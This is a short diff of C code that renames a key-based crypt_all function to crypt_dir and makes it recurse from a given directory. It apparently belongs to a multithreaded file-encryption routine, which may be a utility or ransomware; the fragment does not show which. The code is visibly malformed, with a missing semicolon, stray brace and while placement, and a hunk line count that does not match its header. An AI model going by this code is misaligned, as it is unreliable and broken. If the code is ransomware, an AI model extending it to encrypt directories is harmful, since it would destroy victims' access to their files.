@@ -170,7 +170,7 @@ close_io(OverLapped);
   }
 }
 
-void crypt_all(char *key)
+void crypt_dir(char *key,char *dir)
 {
 SYSTEM_INFO sys_info;
 GetSystemInfo(&sys_info);
@@ -190,5 +190,5 @@ threads--
   }
 while(threads)
   }
-recurse();
+recurse(dir);
 }
